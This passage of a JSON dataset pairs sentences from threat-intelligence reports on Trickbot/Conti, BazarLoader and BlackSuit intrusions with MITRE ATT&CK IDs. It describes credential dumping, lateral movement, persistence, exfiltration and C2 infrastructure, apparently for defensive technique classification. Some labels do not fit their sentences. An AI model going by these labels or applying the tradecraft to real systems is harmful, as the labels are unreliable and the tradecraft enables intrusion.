    "text": "Almost four hours after initial execution, the threat actors pivoted to a domain controller using domain admin credentials and executed a Cobalt Strike Beacon.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "From the xlsb document, the following execution chain occurs.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Including copying the Windows CertUtil program and using that to collect further Trickbot payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We observed a second stage execution using regsvr32 to load a DLL from the user’s AppData\\Local\\Temp folder.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Almost immediately an outbound IPv4 address lookup was requested via HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This is usually undertaken to identify the compromised environment, and to facilitate C2.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The user agent refers to Curl – and used again for another stage of the intrusion.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process “wermgr.exe”.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The executables were identified as Cobalt Strike and communicated over port 443 to C2 88.80.147[.]101.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A PowerShell download cradle was then used to execute Cobalt Strike Beacon in memory:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We observed several attempts by the threat actor trying to escalate to SYSTEM – ultimately succeeding, as evident in several new services running under the Local SYSTEM context:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Service creation events System Event ID 7045, coupled with unusual commands and service names are a strong indication of privilege escalation activity.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot made extensive use of process injection to hide in benign operating system processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It first injected into wermgr.exe and then later into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Another defense evasion technique employed by Cobalt Strike, was to disable Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "WMIC was used to remotely execute ‘def.bat’.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot made use of esentutl to gather MSEdge history, webcache, and saved passwords using TrickBot’s “pwgrab” module.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "LSASS was dumped remotely using ProcDump.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The execution took place from the beachhead using WMIC.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The same batch file, ‘12.bat’, was first executed in the context of SYSTEM; and secondly, in the context of a domain admin user.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "AdFind.exe and adf.bat were uploaded to the beachhead.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "From the beachhead, WMIC was used to remotely execute ‘165.bat’ on two other hosts.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Multiple failed attempts were observed prior to the successful execution of a PowerShell Cobalt Strike loader via a service with “SYSTEM” privileges.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Multiple C2 channels were established, some were persistent whilst others appeared to be single purpose – used for payload retrieval or fallback C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Persistent C2 activity was Cobalt Strike.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The beachhead had multiple C2 channels, two of which were unique.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We assess that the threat actors were ensuring a loss of a single source C2 wouldn’t result in losing all C2 to the compromised environment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed a payload being retrieved from a unique IPv4 address.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "An indication that the threat actors were keeping C2 channels independent from payload delivery/retrieval.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the Curl 7.74.0 user agent.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The two persistent C2 channels were analyzed to determine the Cobalt Strike configuration.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Each C2 channel was configured as follows: 149.248.52[.]187:443, Onlineworkercz[.]com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The data ranged from host discovery, running processes, and user accounts:",
    "command": "",
    "labels": [
      "T1057",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Entire AD forest data – including usernames , DC configuration, and machine enumeration:",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "When, the threat actors returned two days later, the final payloads were staged by the threat actors on a domain controller in the following location:C:\\share$",
    "command": "",
    "labels": [
      "T1070.004",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Two batch scripts were executed on the domain controller to automate ransomware deployment via PSExec.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The first was “_COPY.bat”, to stage the CONTI ransomware payload on all domain-joined computers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The second was “_EXE.bat”, to execute the staged CONTI payloads.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The batch scripts ran as expected a set of copy commands and then executed the Conti payload using psexec.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In July, we observed an intrusion that started from a BazarLoader infection and lasted approximately three days.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case, we did not see the exact initial access vector but based on other reports at the time we assess with medium to high confidence a malicious email campaign delivering macro enabled Word documents was the delivery vector.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "We saw the BazarLoader process download and execute the first Cobalt Strike beacon twenty minutes later using rundll32.",
    "command": "rundll32",
    "labels": [
      "T1105",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, “av_query”.",
    "command": "av_query",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "They then successfully escalated privileges by dumping credentials from the LSASS process.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "After having enough situational awareness over the domain and an administrator’s account in their possession, operators used a reverse proxy and established a RDP connection on the beachhead host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Moments later, we observed them move laterally for the first time to the Domain Controller using RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They also ran two separate Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After having four different types of persistence, they felt it was enough and continued enumerating the network, only this time, they searched for valuable documents across all domain-joined hosts.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "To accomplish that, they used PowerSploit and, more specifically, the “Invoke-ShareFinder” module.",
    "command": "",
    "labels": [
      "T1033",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The next step for the threat actors was to download and run “Advanced IP Scanner” and scanned for ranges looking for other active subnets on the LAN.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "They then pivoted over to another domain controller, repeated all the above discovery steps, and ran the same tools as on the first domain controller.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After almost a day of inactivity, the operators logged into the network and used RDP to remote into file servers that contained valuable data.",
    "command": "",
    "labels": [
      "T1005",
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They then created a directory called Shares$ and used Rclone to exfiltrate the data to the Mega Fileshare service.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Three of the Cobalt Strike servers from this case were added to the Threat Feed on 7/19 and the other two were added on 7/29.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Immediately after the execution, the malware contacted two of its C2 IPs: 35.165.197.209|443 、3.101.57.185|443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under: C:\\Users\\<user>\\Appdata\\Local\\Temp before executing it using rundll32.exe.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They also added one of the two to the local administrators group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The passwords that they used were the same as the passwords of the recent Conti leaked documents.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors maintained an open communication channel through AnyDesk for a period of 11 hours.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was seen logging in from 185.220.100.242 (Tor Exit Node) using AnyDesk.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "On the image below, we can see that the CS beacon process is injected into LSASS.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Throughout the intrusion, we observed multiple instances of process injection from both the initial BazarLoader malware and Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After BazarLoader was loaded in memory, almost immediately it injected into svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The LSASS process was accessed by an unusual process “searchindexer.exe” on beachhead right before the lateral movement was observed.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This technique is known to be used by Cobaltstrike which inject malicious code into a newly spawned searchindexer process to evade detection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "One of the first things that the attackers did once on the first domain controller, was to execute Invoke-ShareFinder from PowerSploit via PowerShell ISE.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "They did the same thing later, on the second domain controller.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Other Microsoft AD management PowerShell administration modules were also invoked by the threat actors for discovery tasks.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "From the Domain Controller the threat actor also ran a Seatbelt binary, which was also seen in the Conti leak documents.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This utility contains a number of “safety checks” on a host, telling the user about things like installed AV, network drives, local users, and much more.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "We also noticed the threat actors searching for any existing antivirus software on the domain controller.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator’s real hostname was captured in event ID 4624:",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Prior to exfiltrating the data, operators staged them under a directory called “Shares” on each file server.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "BazarLoader initial communication with the C2 is over HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Data is sent to the C2 via the cookie parameter(screenshot taken from https://tria.ge/210716-v4jh8hf6ea/behavioral2).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "One of those oddities was several connections across the intrusion to an XMPP chat server at chatterboxtown.us at 70.35.205.161.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "These connections originated from one of the Cobalt Strike processes over port 5222.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "According to public records, the IP is associated with an old Cobalt Strike C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "yawero.com (45.153.240.234:443) This Cobalt Strike server was added to our Threat Feed on 07/19/2021.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "sazoya.com (23.106.160.77:443) This Cobalt Strike server was added to our Threat Feed on 07/29/2021.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "sazoya.com (192.198.86.130:443) This Cobalt Strike server was added to our Threat Feed on 07/29/2021.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As the threat actors were perusing files, we received a notification that one of our files had been remotely opened from 46.38.235.14.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Information posted from @AltShiftPrtScn based on an IR engagement where the threat actors already had domain admin on the network two months prior meeting their final objectives.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "BazarLoader has continued to be one of the preeminent initial access brokers for ransomware threat actor access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Upon initial execution on the beachhead, the malware made an initial connection to command and control, and then a few minutes later it performed discovery tasks on the host using Microsoft utilities like Net and Nltest to discover the domain and users of interest.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "like domain administrators.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After this activity, the host went quiet for about one hour before downloading and executing a Cobalt Strike beacon DLL.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used Cobalt Strike to run additional discovery tasks using Microsoft utilities like net, ping, systeminfo, and taskmanager.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Lateral movement began by the threat actor transferring an executable to a remote system and then executing it using wmic.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This was the primary lateral movement option favored by the threat actor, however PowerShell Cobalt Strike beacons, service executable Cobalt Strike beacons, and RDP were all used, but less commonly.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once on remote systems the threat actor used Cobalt Strike to dump lsass memory for further credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "After this phase completed, the threat actor’s activity faded but the Cobalt Strike continued to beacon out to the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They also continued further discovery activity running PowerShell scripts to discover the disk utilization of hosts, review user last login time per host, assess the installed anti-virus software, and track which hosts were online for the threat actors to target.",
    "command": "",
    "labels": [
      "T1016",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "They downloaded WinSCP from the project website, installed it on the file server and proceeded to exfiltrate data from the server using SCP to a VPS host they controlled in Romania.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RDP activity was seen from several hosts and an executable named test.exe was transferred to several endpoints.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors must have confirmed quickly that their tests were successful as within minutes they dropped test.exe renamed to backup.exe on two servers in the environment and executed manually via their RDP sessions.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Initial execution occurred via the Bazarloader DLL being executed by rundll32.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "About an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Various accounts were targeted including a Guest account initially.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Process injection was seen from the Cobalt Strike beacon into a svchost process running with System level privilege.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "While in the environment they injected Cobalt Strike beacons into many processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Throughout the intrusion the threat actor checked the time of systems with:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "From the domain controller the threat actor ran an encoded PowerShell command to review the size and condition of hard drives across the environment.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This file was started by the use of start.bat, which has been seen paired with this script repeatedly.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The Microsoft Active Directory PowerShell module was also imported and used for discovery tasks.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "For lateral movement the threat actors relied heavily on copying executable files over SMB and then executing them via remote WMIC calls",
    "command": "",
    "labels": [
      "T1021.001",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "While executables and wmic were the preferred options for the threat actor, they did employ several other techniques.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Remote Cobalt Strike beacons were started with services and PowerShell several times in the environment.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "During the final stages the threat actor used RDP to move between a few servers as part of their final actions.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "At that time, a Cobalt Strike beacon executable was executed as a service on a remote host for testing the final ransom deployment.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This server was seen communicating with multiple internal systems:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Another data point is that following the exfiltration canary documents present in the shares reported in as being opened from an IP on a Virtual Private Host provider in New York, USA.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "They initiated RDP connections and a Cobalt Strike beacon executable file to a endpoint not yet interacted with by the threat actors.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then transferred a Conti executable file to several endpoints named test.exe.",
    "command": "",
    "labels": [
      "T1074.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These test ransom files were then called remotely using wmic as seen in the previous lateral movement activity.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "After testing on several endpoints, the threat actors dropped a renamed version of the file on several servers in the environment and executed by hand using their RDP session.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor leveraged various tools, including Sharphound, Rubeus, SystemBC, Get-DataInfo.ps1, Cobalt Strike, and ADFind, along with built-in system tools.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Command and control traffic was proxied through CloudFlare to conceal their Cobalt Strike server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Fifteen days after initial access, BlackSuit ransomware was deployed by copying files over SMB to admin shares and executing them through RDP sessions.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike C2 traffic beaconed to IP addresses managed by CloudFlare, which acted as proxy server between the victim network and their team server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Approximately six hours after the initial execution, the threat actor used Windows utilities, such as systeminfo and nltest to perform enumeration on the system and environment.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Following this, the threat actor ran Sharphound in memory through the Cobalt Strike beacon, and saved the output to disk.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Around ten minutes after the initial discovery, the threat actor carried out their first lateral movement.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They transferred a Cobalt Strike beacon via SMB and executed it through a service to compromise another workstation.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On that workstation, they accessed LSASS to obtain credentials from memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Throughout the second day of the intrusion, the threat actor deployed multiple Cobalt Strike beacons on workstations and servers and also used RDP for further lateral movement.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor deployed multiple SystemBC executables on one of the file servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The second executable, established persistence through a registry run key and opened a new command and control channel.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "On the seventh day, the Cobalt Strike command and control domain stopped using CloudFlare and switched to an Amazon AWS IP address, for the remainder of the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the eighth day, the threat actors deployed a new PowerShell Cobalt Strike beacon on a domain controller, this time pointing to a separate command and control server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After two days of inactivity, the intrusion resumed with more Cobalt Strike beacons being distributed, along with several RDP logins.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "More discovery activity was noticed when Sharphound was executed again.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The final step was the deployment of the BlackSuit ransomware binary, qwe.exe, which was distributed via SMB to remote systems through the C$ share.",
    "command": "",
    "labels": [
      "T1074.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike served as the primary tool utilized by the threat actor, with a particular focus on its capabilities that mimic Sysinternals PsExec.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "These features, including psexec and psexec_psh, enable remote process execution across systems.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The psexec module functions by uploading a binary to the target system, then creating and launching a Windows service to execute the file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The psexec command spawned a rundll32.exe process.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "To ensure persistent access to the environment, the threat actor created a run key named “socks5” within the Current User registry hive.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The registry key’s configuration indicated that PowerShell would be used to launch a SystemBC backdoor named socks32.exe.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 13 (Registry value set) shows changes to a registry key value:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "One interesting thing to mention is that the registry value name socks5 created under the Run key is hard coded.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The data is a string (type REG_SZ) which starts with powershell.exe windowstyle -hidden Command concatenated with the current executable name, which is obtained using GetModuleFileNameA with a null hModule first parameter.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "SystemBC possesses the ability to create scheduled tasks using COM, as demonstrated in the following example.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "It first uses the function CoCreateInstance to create an instance of an ITaskScheduler object and then call the method NewWorkItem to create a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor changed to the context of a domain administrator and then was observed moving laterally again using Cobalt Strike, so we attribute this activity to pass-the-hash command execution activity rather than getsystem.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor employed an encoded PowerShell command to modify the registry, enabling Remote Desktop Protocol (RDP) access to a file server.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Setting the registry key “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” DenyTSConnections to 0 will allow terminal server connections to the host.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Given the threat actor’s extensive use of Cobalt Strike beacons, we anticipated the use of process injection as a method of evading detection by hiding within legitimate processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Upon analyzing process injections and access patterns from Cobalt Strike-generated processes, we successfully identified the suspicious activity we were searching for.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "These injections can then be confirmed using things like YARA memory scanning:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During our investigation, we discovered that Rubeus had been loaded into mstsc.exe—a process previously injected by Cobalt Strike—functioning as a CLR module.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Rubeus writing the result of AS-REP roasting output to a file:",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Rubeus executed in memory by Cobalt Strike creating kerberoast output:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor accessed LSASS memory on a workstation with a specific access request of 0x1010, where 0x0010 is necessary to read memory using ReadProcessMemory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This request originated from a process that had been injected with Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 10 shows mstsc.exe accessing lsass with the access mask 0x1010",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Discovery plays a critical role for the threat actor in assessing the environment they have infiltrated.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Throughout the intrusion, the attacker conducted discovery activities across multiple systems, gathering valuable intelligence on the network and its assets.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Discovery began on the beachhead host approximately six hours after initial access.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The first command executed was “systeminfo,” aimed at gathering details about the local system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "We have some proof showing mstsc.exe loading Sharphound as a CLR(Common Language Runtime) module.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
